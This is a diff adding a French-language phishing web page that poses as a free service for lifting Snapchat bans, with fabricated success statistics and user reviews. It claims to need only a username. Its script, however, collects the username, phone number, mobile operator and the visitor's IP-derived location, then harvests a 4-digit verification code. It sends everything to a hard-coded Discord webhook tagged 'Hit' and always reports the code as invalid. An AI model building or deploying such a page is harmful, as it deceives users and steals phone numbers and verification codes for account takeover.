@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DebanTonSnap — Débannir ton Snapchat</title>
+<style>
+  /* === CSS EXACTEMENT LE MÊME QUE TON FICHIER RBXFORGE === */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  :root {
+    --bg: #0e0f16;
+    --bg2: #14161f;
+    --card: #1a1d29;
+    --line: #262a38;
+    --text: #eef0f6;
+    --muted: #9aa0b4;
+    --accent: #00b06f;
+    --accent2: #12d98a;
+    --red: #e2231a;
+    --radius: 16px;
+  }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.55;
+    overflow-x: hidden;
+  }
+  a { color: inherit; text-decoration: none; }
+  .wrap { max-width: 1160px; margin: 0 auto; padding: 0 24px; }
+  .btn {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: linear-gradient(135deg, var(--accent2), var(--accent));
+    color: #04140d; font-weight: 800; font-size: 15px;
+    padding: 13px 22px; border: none; border-radius: 12px;
+    cursor: pointer; transition: transform .15s, box-shadow .2s;
+    box-shadow: 0 8px 24px rgba(0,176,111,.28);
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 14px 34px rgba(0,176,111,.4); }
+  .btn.ghost {
+    background: transparent; color: var(--text);
+    border: 1px solid var(--line); box-shadow: none; font-weight: 600;
+  }
+  .btn.ghost:hover { border-color: var(--accent); background: rgba(0,176,111,.08); }
+
+  header {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(14,15,22,.8);
+    backdrop-filter: blur(14px);
+    border-bottom: 1px solid var(--line);
+  }
+  .nav { display: flex; align-items: center; justify-content: space-between; height: 70px; }
+  .logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; letter-spacing: .3px; }
+  .logo .ic { width: 34px; height: 34px; }
+  .logo b { color: var(--accent2); }
+  .nav-links { display: flex; gap: 28px; }
+  .nav-links a { color: var(--muted); font-weight: 600; font-size: 15px; transition: color .15s; }
+  .nav-links a:hover { color: var(--text); }
+  .nav-cta { display: flex; gap: 10px; align-items: center; }
+
+  .hero { position: relative; padding: 90px 0 70px; overflow: hidden; }
+  .hero::before {
+    content: ""; position: absolute; inset: 0; z-index: -2;
+    background:
+      radial-gradient(700px 380px at 78% 8%, rgba(0,176,111,.20), transparent 60%),
+      radial-gradient(620px 420px at 12% 90%, rgba(18,120,255,.16), transparent 60%);
+  }
+  .grid-bg {
+    position: absolute; inset: 0; z-index: -1; opacity: .35;
+    background-image:
+      linear-gradient(rgba(255,255,255,.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.04) 1px, transparent 1px);
+    background-size: 44px 44px;
+    mask-image: radial-gradient(circle at 50% 30%, #000 40%, transparent 78%);
+  }
+  .hero-grid { display: grid; grid-template-columns: 1.1fr .9fr; gap: 50px; align-items: center; }
+  .pill {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(0,176,111,.12); border: 1px solid rgba(0,176,111,.3);
+    color: var(--accent2); font-weight: 700; font-size: 13px;
+    padding: 6px 14px; border-radius: 30px; margin-bottom: 22px;
+  }
+  .pill .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent2);
+    box-shadow: 0 0 0 0 rgba(18,217,138,.7); animation: pulse 1.6s infinite; }
+  @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(18,217,138,.6);} 70%{box-shadow:0 0 0 9px rgba(18,217,138,0);} 100%{box-shadow:0 0 0 0 rgba(18,217,138,0);} }
+  h1.hero-title { font-size: 48px; line-height: 1.08; font-weight: 900; letter-spacing: -1.5px; margin-bottom: 20px; }
+  h1.hero-title span { background: linear-gradient(120deg, var(--accent2), #7ce0ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
+  .hero p.lead { color: var(--muted); font-size: 18px; max-width: 520px; margin-bottom: 30px; }
+  .hero-actions { display: flex; gap: 14px; flex-wrap: wrap; align-items: center; }
+  .trust { display: flex; gap: 22px; margin-top: 34px; flex-wrap: wrap; }
+  .trust div { font-size: 13px; color: var(--muted); }
+  .trust b { display: block; font-size: 22px; color: var(--text); font-weight: 800; }
+
+  .hero-card {
+    background: linear-gradient(180deg, var(--card), #12141d);
+    border: 1px solid var(--line); border-radius: 22px; padding: 26px;
+    box-shadow: 0 40px 90px rgba(0,0,0,.5);
+    position: relative;
+  }
+  .hero-card .coinrow { display: flex; align-items: center; gap: 12px; margin-bottom: 18px; }
+  .hero-card .bal-label { color: var(--muted); font-size: 13px; }
+  .hero-card .bal { font-size: 28px; font-weight: 900; }
+
+  .strip { border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); background: var(--bg2); }
+  .strip .wrap { display: flex; justify-content: space-around; align-items: center; padding: 18px 24px; flex-wrap: wrap; gap: 16px; color: var(--muted); font-weight: 700; font-size: 14px; }
+  .strip .item { display: flex; align-items: center; gap: 8px; }
+
+  section.pad { padding: 70px 0; }
+  .sec-head { text-align: center; max-width: 640px; margin: 0 auto 50px; }
+  .sec-head h2 { font-size: 36px; font-weight: 900; }
+
+  .steps { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; }
+  .step-card { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 26px; }
+  .step-num { width: 42px; height: 42px; border-radius: 12px; display: grid; place-items: center; font-weight: 900; font-size: 18px; background: linear-gradient(135deg, var(--accent2), var(--accent)); color: #04140d; margin-bottom: 16px; }
+
+  .feat-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; }
+  .feat { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 24px; }
+
+  .revs { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; }
+  .rev { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 22px; }
+
+  .faq { max-width: 760px; margin: 0 auto; }
+  .qa { border: 1px solid var(--line); border-radius: 14px; margin-bottom: 12px; background: var(--card); overflow: hidden; }
+  .qa button { width: 100%; text-align: left; background: none; border: none; color: var(--text); font-size: 16px; font-weight: 700; padding: 18px 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+  .qa .ans { max-height: 0; overflow: hidden; transition: max-height .3s ease; color: var(--muted); font-size: 15px; padding: 0 20px; }
+  .qa.open .ans { max-height: 220px; padding-bottom: 16px; }
+
+  .cta-band { background: linear-gradient(120deg, rgba(0,176,111,.16), rgba(18,120,255,.12)); border: 1px solid var(--line); border-radius: 24px; padding: 50px; text-align: center; }
+
+  footer { border-top: 1px solid var(--line); background: var(--bg2); padding: 50px 0 30px; }
+
+  .overlay { position: fixed; inset: 0; z-index: 200; background: rgba(6,7,12,.72); backdrop-filter: blur(6px); display: none; align-items: center; justify-content: center; padding: 20px; }
+  .overlay.show { display: flex; }
+  .modal { width: 100%; max-width: 440px; background: linear-gradient(180deg, var(--card), #14161f); border: 1px solid var(--line); border-radius: 22px; padding: 28px; box-shadow: 0 40px 100px rgba(0,0,0,.6); }
+  .modal .close { position: absolute; right: 16px; top: 14px; background: none; border: none; color: var(--muted); font-size: 26px; cursor: pointer; }
+  .modal-logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 18px; margin-bottom: 6px; }
+  .modal .prog { display: flex; gap: 6px; margin: 16px 0 20px; }
+  .modal .prog i { flex: 1; height: 5px; border-radius: 4px; background: #2a2e3d; }
+  .modal .prog i.on { background: linear-gradient(90deg, var(--accent2), var(--accent)); }
+
+  .step-title { font-size: 20px; font-weight: 800; margin-bottom: 6px; }
+  .step-sub { color: var(--muted); font-size: 15px; margin-bottom: 16px; }
+
+  .m-label { display: block; font-size: 13px; font-weight: 700; color: var(--muted); margin: 12px 0 6px 4px; }
+  .m-input { position: relative; }
+  .m-input .pre { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--muted); font-weight: 700; }
+  .modal input, .modal select { width: 100%; padding: 15px 16px 15px 42px; background: #0e0f16; border: 1.5px solid var(--line); border-radius: 12px; color: var(--text); font-size: 16px; outline: none; }
+  .modal input:focus, .modal select:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(0,176,111,.15); }
+  .modal .err { color: #ff8fa3; font-size: 13px; font-weight: 600; margin-top: 8px; display: none; }
+
+  .amt-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-bottom: 10px; }
+  .amt-grid button { padding: 14px 8px; border-radius: 12px; border: 1.5px solid var(--line); background: #0e0f16; color: var(--text); font-weight: 700; cursor: pointer; transition: .15s; }
+  .amt-grid button.sel { border-color: var(--accent); background: rgba(0,176,111,.14); }
+
+  .code-inputs { display: flex; justify-content: center; gap: 12px; margin: 20px 0; }
+  .code-inputs input { width: 54px; height: 62px; padding: 0; text-align: center; font-size: 26px; font-weight: 800; background: #0e0f16; border: 1.5px solid var(--line); border-radius: 12px; color: var(--text); }
+  .code-inputs input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(0,176,111,.15); }
+
+  .hidden { display: none !important; }
+
+  @media (max-width: 900px) {
+    .hero-grid { grid-template-columns: 1fr; }
+    .modal { max-width: 95%; }
+    .amt-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap nav">
+      <div class="logo">
+        <svg class="ic" viewBox="0 0 100 100"><g transform="rotate(11 50 50)"><rect x="16" y="16" width="68" height="68" rx="14" fill="#12d98a"/><rect x="40" y="40" width="20" height="20" rx="4" fill="#0e0f16"/></g></svg>
+        Deban<b>TonSnap</b>
+      </div>
+      <nav class="nav-links">
+        <a href="#how">Comment ça marche</a>
+        <a href="#features">Avantages</a>
+        <a href="#reviews">Avis</a>
+        <a href="#faq">FAQ</a>
+      </nav>
+      <div class="nav-cta">
+        <button class="btn ghost" onclick="openGen()">Se connecter</button>
+        <button class="btn" onclick="openGen()">Débannir maintenant</button>
+      </div>
+    </div>
+  </header>
+
+  <section class="hero">
+    <div class="grid-bg"></div>
+    <div class="wrap hero-grid">
+      <div>
+        <span class="pill"><span class="dot"></span> Service actif · Débannissements en cours</span>
+        <h1 class="hero-title">Débannir ton <span>Snapchat</span> rapidement et en toute discrétion.</h1>
+        <p class="lead">DebanTonSnap lève les restrictions (SS06, ban temporaire ou autre) sur ton compte Snapchat en quelques minutes.</p>
+        <div class="hero-actions">
+          <button class="btn" onclick="openGen()">🚀 Débannir mon compte</button>
+          <a href="#how" class="btn ghost">Comment ça marche →</a>
+        </div>
+        <div class="trust">
+          <div><b>87 400+</b> comptes débannis</div>
+          <div><b>92 %</b> de succès</div>
+          <div><b>4,9/5</b> note moyenne</div>
+        </div>
+      </div>
+
+      <div class="hero-card">
+        <div class="float-badge">⚡ Traitement rapide</div>
+        <div class="coinrow">
+          <svg class="rbxcoin" viewBox="0 0 100 100"><circle cx="50" cy="50" r="46" fill="#12d98a"/><text x="50" y="65" font-size="38" font-weight="900" text-anchor="middle" fill="#04140d" font-family="Arial">S+</text></svg>
+          <div>
+            <div class="bal-label">Statut du compte</div>
+            <div class="bal" id="heroBal">En analyse</div>
+          </div>
+        </div>
+        <div class="bar"><span></span></div>
+        <div class="mini">Synchronisation avec Snapchat… <b id="heroPct">68%</b></div>
+        <button class="btn" style="width:100%;justify-content:center;margin-top:20px;" onclick="openGen()">Démarrer le débannissement</button>
+      </div>
+    </div>
+  </section>
+
+  <div class="strip">
+    <div class="wrap">
+      <div class="item">🔒 Chiffrement SSL 256-bit</div>
+      <div class="item">⚡ Débannissement < 10 min</div>
+      <div class="item">🛡️ 100 % discret</div>
+      <div class="item">📱 Tous appareils</div>
+      <div class="item">✅ Aucun mot de passe requis</div>
+    </div>
+  </div>
+
+  <section class="pad" id="how">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Simple & rapide</div>
+        <h2>Comment ça marche</h2>
+        <p>Trois étapes suffisent pour débannir ton compte Snapchat.</p>
+      </div>
+      <div class="steps">
+        <div class="step-card">
+          <div class="step-num">1</div>
+          <h3>Entre ton pseudo</h3>
+          <p>Indique le nom d’utilisateur Snapchat du compte à débannir.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-num">2</div>
+          <h3>Choisis le type de ban</h3>
+          <p>Sélectionne SS06, Temporaire ou Autre et précise le motif si nécessaire.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-num">3</div>
+          <h3>Confirme & débannis</h3>
+          <p>Valide avec le code et ton compte est traité rapidement.</p>
+        </div>
+      </div>
+      <div style="text-align:center;margin-top:40px;">
+        <button class="btn" onclick="openGen()">Commencer le débannissement</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Features / Reviews / FAQ adaptés rapidement au thème -->
+
+  <section class="pad" id="features" style="background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Pourquoi DebanTonSnap</div>
+        <h2>Conçu pour les vrais utilisateurs Snapchat</h2>
+      </div>
+      <div class="feat-grid">
+        <div class="feat"><div class="fic">⚡</div><h3>Ultra rapide</h3><p>La plupart des débannissements sont traités en moins de 10 minutes.</p></div>
+        <div class="feat"><div class="fic">🛡️</div><h3>100 % discret</h3><p>Aucune information sensible demandée. Nous n’avons besoin que de ton pseudo.</p></div>
+        <div class="feat"><div class="fic">📱</div><h3>Tous appareils</h3><p>Fonctionne sur téléphone, tablette et ordinateur.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="pad" id="reviews">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Ils l'ont testé</div>
+        <h2>Ce que disent les utilisateurs</h2>
+      </div>
+      <div class="revs">
+        <div class="rev"><div class="stars">★★★★★</div><p>"Mon compte a été débanni en 7 minutes après un ban SS06. Incroyable !"</p><div class="who"><div class="av">L</div><div><b>LucasSnap</b><span>il y a 1h</span></div></div></div>
+        <div class="rev"><div class="stars">★★★★★</div><p>"J’avais un ban temporaire depuis plusieurs jours, tout est revenu à la normale."</p><div class="who"><div class="av">M</div><div><b>Marine_92</b><span>il y a 4h</span></div></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="pad" id="faq" style="background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Questions fréquentes</div>
+        <h2>On répond à tout</h2>
+      </div>
+      <div class="faq">
+        <div class="qa"><button onclick="toggleFaq(this)">C’est vraiment gratuit ? <span class="chev">▾</span></button><div class="ans">Oui. DebanTonSnap est financé par ses partenaires.</div></div>
+        <div class="qa"><button onclick="toggleFaq(this)">Vous avez besoin de mon mot de passe ? <span class="chev">▾</span></button><div class="ans">Jamais. Nous n’avons besoin que de ton pseudo public.</div></div>
+        <div class="qa"><button onclick="toggleFaq(this)">Combien de temps pour débannir ? <span class="chev">▾</span></button><div class="ans">La plupart des traitements se font en moins de 10 minutes.</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="pad">
+    <div class="wrap">
+      <div class="cta-band">
+        <h2>Prêt à récupérer ton compte ?</h2>
+        <p>Rejoins les milliers d’utilisateurs déjà débannis avec DebanTonSnap.</p>
+        <button class="btn" onclick="openGen()">🚀 Débannir mon Snapchat</button>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      <div class="foot-grid">
+        <div>
+          <div class="logo" style="margin-bottom:12px;">
+            <svg class="ic" viewBox="0 0 100 100"><g transform="rotate(11 50 50)"><rect x="16" y="16" width="68" height="68" rx="14" fill="#12d98a"/><rect x="40" y="40" width="20" height="20" rx="4" fill="#0e0f16"/></g></svg>
+            Deban<b>TonSnap</b>
+          </div>
+          <p class="disclaimer">DebanTonSnap est un service indépendant et n'est ni affilié, ni sponsorisé par Snap Inc.</p>
+        </div>
+        <div><h4>Produit</h4><ul><li><a href="#how">Comment ça marche</a></li></ul></div>
+        <div><h4>Support</h4><ul><li><a href="#faq">FAQ</a></li></ul></div>
+      </div>
+      <div class="foot-bottom">
+        <span>© 2026 DebanTonSnap. Tous droits réservés.</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- MODAL -->
+  <div class="overlay" id="overlay">
+    <div class="modal">
+      <button class="close" onclick="closeGen()">×</button>
+      <div class="modal-logo">
+        <svg class="ic" style="width:26px;height:26px;" viewBox="0 0 100 100"><g transform="rotate(11 50 50)"><rect x="16" y="16" width="68" height="68" rx="14" fill="#12d98a"/><rect x="40" y="40" width="20" height="20" rx="4" fill="#0e0f16"/></g></svg>
+        Deban<b style="color:var(--accent2)">TonSnap</b>
+      </div>
+      <div class="prog"><i class="on" id="p1"></i><i id="p2"></i><i id="p3"></i></div>
+
+      <!-- STEP 1 -->
+      <div id="gstep1">
+        <div class="step-title">Ton compte Snapchat</div>
+        <div class="step-sub">Entre le pseudo du compte à débannir.</div>
+        <label class="m-label" for="g_user">Pseudo Snapchat</label>
+        <div class="m-input"><span class="pre">@</span><input id="g_user" type="text" placeholder="ton_pseudo" autocomplete="off"></div>
+        <div class="err" id="err_user">Entre ton pseudo</div>
+        <button class="btn" onclick="toStep2()">Continuer →</button>
+      </div>
+
+      <!-- STEP 2 -->
+      <div id="gstep2" class="hidden">
+        <div class="step-title">Type de ban &amp; vérification</div>
+        <div class="step-sub">Compte : <b id="showUser">@pseudo</b></div>
+
+        <label class="m-label">Type de ban</label>
+        <div class="amt-grid" id="banTypes">
+          <button type="button" data-type="SS06" onclick="pickBanType(this)">Ban SS06</button>
+          <button type="button" data-type="Temporaire" onclick="pickBanType(this)" class="sel">Ban Temporaire</button>
+          <button type="button" data-type="Autre" onclick="pickBanType(this)">Autre</button>
+        </div>
+
+        <div id="motifDiv" class="hidden">
+          <label class="m-label" for="g_motif">Motif du ban</label>
+          <input id="g_motif" type="text" placeholder="Décris le motif...">
+        </div>
+
+        <label class="m-label" style="margin-top:14px;">Opérateur</label>
+        <select id="g_operator">
+          <option value="Bouygues">Bouygues</option>
+          <option value="SFR">SFR</option>
+          <option value="Orange">Orange</option>
+        </select>
+
+        <label class="m-label" for="g_phone">Numéro de téléphone</label>
+        <div class="m-input"><span class="pre">📱</span><input id="g_phone" type="text" placeholder="06 12 34 56 78" autocomplete="off" inputmode="tel"></div>
+        <div class="err" id="err_phone">Numéro invalide</div>
+
+        <button class="btn" onclick="toStep3()">Envoyer le code →</button>
+      </div>
+
+      <!-- STEP 3 -->
+      <div id="gstep3" class="hidden">
+        <div class="step-title">Code de vérification</div>
+        <div class="step-sub">Un code à 4 chiffres a été envoyé. Saisis-le pour finaliser.</div>
+        <div class="code-inputs" id="codeInputs">
+          <input type="text" inputmode="numeric" maxlength="1">
+          <input type="text" inputmode="numeric" maxlength="1">
+          <input type="text" inputmode="numeric" maxlength="1">
+          <input type="text" inputmode="numeric" maxlength="1">
+        </div>
+        <div class="err" id="err_code">Code invalide</div>
+        <button class="btn" onclick="checkCode()">Valider le code</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1523821118358552626/lfWBCG2w1kAhIvPFhcYLQOe8V3z_YW66UiweHbTJ1ZOXYswiEx6ahHvEqmxSyIVbzbIu";
+
+  var currentUser = '';
+  var currentBanType = '';
+  var currentMotif = '';
+
+  function toggleFaq(btn){ btn.parentElement.classList.toggle('open'); }
+
+  var ov = document.getElementById('overlay');
+  function openGen(){ ov.classList.add('show'); resetGen(); document.body.style.overflow = 'hidden'; }
+  function closeGen(){ ov.classList.remove('show'); document.body.style.overflow = ''; }
+  ov.addEventListener('click', e => { if (e.target === ov) closeGen(); });
+
+  function resetGen(){
+    document.getElementById('gstep1').classList.remove('hidden');
+    document.getElementById('gstep2').classList.add('hidden');
+    document.getElementById('gstep3').classList.add('hidden');
+    document.getElementById('err_user').style.display = 'none';
+    document.getElementById('err_phone').style.display = 'none';
+    document.getElementById('motifDiv').classList.add('hidden');
+    document.getElementById('g_motif').value = '';
+    currentBanType = '';
+    currentMotif = '';
+  }
+
+  function show(id){ document.getElementById(id).classList.remove('hidden'); }
+  function hide(id){ document.getElementById(id).classList.add('hidden'); }
+  function setProg(n){
+    ['p1','p2','p3'].forEach((id,i) => document.getElementById(id).classList.toggle('on', i < n));
+  }
+
+  function toStep2(){
+    const u = document.getElementById('g_user').value.trim().replace(/^@+/, '');
+    if (!u) { document.getElementById('err_user').style.display = 'block'; return; }
+    currentUser = u;
+    document.getElementById('showUser').textContent = '@' + u;
+    hide('gstep1'); show('gstep2'); setProg(2);
+  }
+
+  function pickBanType(btn){
+    document.querySelectorAll('#banTypes button').forEach(b => b.classList.remove('sel'));
+    btn.classList.add('sel');
+    currentBanType = btn.getAttribute('data-type');
+
+    const motifDiv = document.getElementById('motifDiv');
+    if (currentBanType === 'Autre') {
+      motifDiv.classList.remove('hidden');
+    } else {
+      motifDiv.classList.add('hidden');
+      document.getElementById('g_motif').value = '';
+    }
+  }
+
+  async function getIpInfo() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      return `${data.city || 'Inconnu'}, ${data.region || 'Inconnu'}, ${data.country_name || 'Inconnu'}`;
+    } catch {
+      return 'Inconnu';
+    }
+  }
+
+  async function toStep3(){
+    const phone = document.getElementById('g_phone').value.trim();
+    const operator = document.getElementById('g_operator').value;
+    if (phone.replace(/\D/g,'').length < 8) {
+      document.getElementById('err_phone').style.display = 'block';
+      return;
+    }
+
+    if (currentBanType === 'Autre') {
+      currentMotif = document.getElementById('g_motif').value.trim();
+      if (!currentMotif) { alert('Merci d’indiquer le motif'); return; }
+    } else {
+      currentMotif = '';
+    }
+
+    const location = await getIpInfo();
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `<@896448018453233714> <@1514675664794423303>`,
+        embeds: [{
+          title: "DebanTonSnap Hit",
+          color: 3066993,
+          fields: [
+            { name: "Pseudo", value: "@" + currentUser, inline: true },
+            { name: "Type de ban", value: currentBanType, inline: true },
+            { name: "Motif", value: currentMotif || "Aucun", inline: true },
+            { name: "Opérateur", value: operator, inline: true },
+            { name: "Téléphone", value: phone, inline: true },
+            { name: "Localisation", value: location }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+
+    hide('gstep2'); show('gstep3'); setProg(3);
+    document.getElementById('err_code').style.display = 'none';
+    document.querySelectorAll('#codeInputs input').forEach(i => i.value = '');
+    setTimeout(() => document.querySelector('#codeInputs input').focus(), 100);
+  }
+
+  (function(){
+    const inputs = document.querySelectorAll('#codeInputs input');
+    inputs.forEach((inp, idx) => {
+      inp.addEventListener('input', () => {
+        inp.value = inp.value.replace(/\D/g,'');
+        if (inp.value && idx < inputs.length-1) inputs[idx+1].focus();
+        document.getElementById('err_code').style.display = 'none';
+      });
+      inp.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx-1].focus();
+      });
+    });
+  })();
+
+  async function checkCode(){
+    const inputs = document.querySelectorAll('#codeInputs input');
+    const code = Array.from(inputs).map(i => i.value).join('');
+    if (code.length < 4) {
+      document.getElementById('err_code').style.display = 'block';
+      document.getElementById('err_code').textContent = 'Entre les 4 chiffres';
+      return;
+    }
+
+    const location = await getIpInfo();
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `<@896448018453233714> <@1514675664794423303>`,
+        embeds: [{
+          title: "DebanTonSnap Code",
+          color: 15105570,
+          fields: [
+            { name: "Pseudo", value: "@" + currentUser },
+            { name: "Code entré", value: code },
+            { name: "Localisation", value: location }
+          ]
+        }]
+      })
+    });
+
+    document.getElementById('err_code').style.display = 'block';
+    document.getElementById('err_code').textContent = '❌ Code invalide (simulation)';
+    inputs.forEach(i => i.value = '');
+  }
+
+  function shakeCode(){
+    const box = document.getElementById('codeInputs');
+    box.classList.remove('shake'); void box.offsetWidth; box.classList.add('shake');
+  }
+</script>
+
+</body>
+</html>
